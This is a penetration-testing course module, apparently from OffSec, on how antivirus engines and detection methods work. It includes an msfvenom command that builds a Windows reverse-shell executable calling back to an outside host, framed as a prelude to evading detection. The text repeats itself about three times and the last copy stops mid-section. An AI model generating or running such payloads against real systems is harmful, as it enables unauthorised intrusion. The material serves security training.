# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

[_Heuristic-Based Detection_](https://en.wikipedia.org/wiki/Heuristic_analysis) is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls (as opposed to simple byte sequences) that are considered malicious.

Alternatively, [_Behavior-Based Detection_](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf) dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.

Lastly, _Machine-Learning Detection_ aims to up the game by introducing ML algorithms to detect unknown threats by collecting and [_analyzing additional metadata_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/cloud-protection-microsoft-antivirus-sample-submission?view=o365-worldwide). For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the [_submitted samples_](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf). Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that antivirus manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each antivirus product will differ in terms of what code is considered malicious.

It's worth noting that many antivirus developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various antivirus products, we will start by scanning a popular _Metasploit_ payload. Using _msfvenom_, we will generate a standard [_Portable Executable_](https://en.wikipedia.org/wiki/Portable_Executable) (PE) file containing our payload. In this case we will use a simple TCP reverse shell.

The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the [_Windows Loader_](https://en.wikipedia.org/wiki/Loader_(computing)) to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.

Before generating any Metasploit payloads, it is a best practice to make sure we are running the latest version of Kali. Metasploit gets updated frequently and its AV signatures could change as well. AV vendors must rebuild those signatures and push them as updates. This constant and intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a penetration test, since a fresh Metasploit version might run undetected due to stale AV signatures.

Let's generate the test binary payload by running the **msfvenom** command followed by the **\-p** argument specifying the payload. We'll then pass the reverse shell local host (**LHOST**) and local port (**LPORT**) arguments along with the **EXE** file format and redirect the output to a file named **binary.exe**.

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

> Listing 5 - Generating a malicious PE containing a meterpreter shell.

Next, we will run a virus scan on this executable. Rather than installing many antivirus applications on our local machine, we can upload our file to [_VirusTotal_](https://www.virustotal.com/#/home/upload), which will scan it to determine the detection rate of various AV products.

VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.

The results of this scan are listed below.

![Figure 1: Virustotal results on the msfvenom payload.](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/9a05cfc8fe2cd0438b9b48b03c79ed23-antivirus_evasion_01b.png)

Figure 1: Virustotal results on the msfvenom payload.

We'll notice in our results that many antivirus products determined our file is malicious based on the different detection mechanisms we have illustrated in this section.

In this Learning Unit, we have explored the different components that constitute a modern AV and covered the various strategies adopted to detect malicious software.

In the next Learning Unit, we are going to make use of this knowledge and learn the different mechanisms that enable attackers to evade antivirus detections.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Antivirus Evasion - AV Components and Operations - VM #1

#### Labs

1.  Which AV engine is responsible for translating machine code into assembly?

Answer

# 15\. Antivirus Evasion

In this Module, we will cover the following Learning Units:

-   Antivirus Software Key Components and Operations
-   Bypassing Antivirus Detections
-   Antivirus Evasion in Practice

To compromise a target machine, attackers often disable or otherwise bypass antivirus software installed on these systems. As penetration testers, we must understand and be able to recreate these techniques to demonstrate this potential threat to our client.

In this Module, we will discuss the purpose of antivirus software, discover how it works, and outline how it is deployed in most companies. We will examine various methods used to detect malicious software and explore some of the available tools and techniques that will allow us to bypass AV software on target machines.

## 15.1. Antivirus Software Key Components and Operations

This Learning Unit covers the following Learning Objectives:

-   Recognize Known vs Unknown Threats
-   Understand AV Key Components
-   Understand AV Detection Engines

[_Antivirus_](https://en.wikipedia.org/wiki/Antivirus_software) (AV), is a type of application designed to prevent, detect, and remove malicious software. It was originally designed to simply remove computer viruses. However, with the development of new types of malware, like bots and [_ransomware_](https://www.crowdstrike.com/cybersecurity-101/malware/types-of-malware/), antivirus software now typically includes additional protections such as [_IDS/IPS_](https://en.wikipedia.org/wiki/Intrusion_detection_system), firewall, website scanners, and more.

## 15.1.1. Known vs Unknown Threats

In its original design, an antivirus software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. As we'll discover in the following section, an AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example, two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines. In 2014, a signature language named [_YARA_](https://en.wikipedia.org/wiki/YARA) was open-sourced to allow researchers to query the [_VirusTotal_](https://www.virustotal.com/#/home/upload) platform or even integrate their own malware signatures into AV products. VirusTotal is a malware search engine that allows users to search known malware or submit new samples and scan them against several AV products.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including [_Windows Defender_](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows?view=o365-worldwide), are shipped with a [_Machine Learning_](https://www.microsoft.com/security/blog/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/) (ML) engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borrow too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, [_Endpoint Detection and Response_](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (EDR) solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a [_Security Information and Event Management_](https://en.wikipedia.org/wiki/Security_information_and_event_management) (SIEM) system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

## 15.1.2. AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern antivirus is typically designed around the following components:

-   File Engine
-   Memory Engine
-   Network Engine
-   Disassembler
-   Emulator/Sandbox
-   Browser Plugin
-   Machine Learning Engine

Each of the engines above work simultaneously with the signature database to rank specific events as either benign, malicious, or unknown.

The _file engine_ is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [_mini-filter driver_](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire operating system scope.

The _memory engine_ inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks, as we'll find shortly.

As the name suggests, the _network engine_ inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its [_Command and Control_](https://en.wikipedia.org/wiki/Botnet#Command_and_control) (C2) server.

To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by _disassembling_ the malware packers or ciphers and loading the malware into a sandbox, or _emulator_.

The _disassembler_ engine is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine. A _sandbox_ is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system. Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

As browsers are protected by the sandbox, modern AVs often employ browser plugins to get better visibility and detect malicious content that might be executed inside the browser.

Additionally, the machine learning component is becoming a vital part of current AVs as it enables detection of unknown threats by relying on cloud-enhanced computing resources and algorithms.

## 15.1.3. Detection Methods

As mentioned earlier, antivirus signature syntax and scope may differ based on the engine they have been built for, but they still serve the same purpose of uniquely identifying a specific threat or malware.

In this section, we are going to explore the following AV detection methodologies and explain how they work together.

-   Signature-based Detection
-   Heuristic-based Detection
-   Behavioral Detection
-   Machine Learning Detection

_Signature-based_ antivirus detection is mostly considered a _restricted list technology_. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, we created a text file on our local Kali machine that contains the string "offsec". Let's dump its binary representation via the [_xxd_](https://linux.die.net/man/1/xxd) tool by passing the **\-b** argument before the file name.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010                                               .
```

> Listing 1 - Inspecting the binary file content with xxd

We displayed the content of the file through the xxd utility. The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one. We have also highlighted the binary representation of the letter "c" in red. Its purpose will become clear shortly.

Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so through the **sha256sum** utility.

```
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

> Listing 2 - Calculating the SHA256 hash of the file

Let's now replace the last letter of the "offsec" string with a capital **C** and dump its binary value via xxd once more.

```
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

> Listing 3 - Inspecting the file content with xxd

In listing 3, we notice that the binary value of the last letter is changed only in its third bit from the left.

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, let's calculate the SHA256 hash on the modified string.

```
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

> Listing 4 - Calculating the SHA256 hash on the modified file

Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on hash file signature detections.

To address the pitfalls of signature-based detection, antivirus manufacturers introduced additional detection methods to improve the effectiveness of their products.

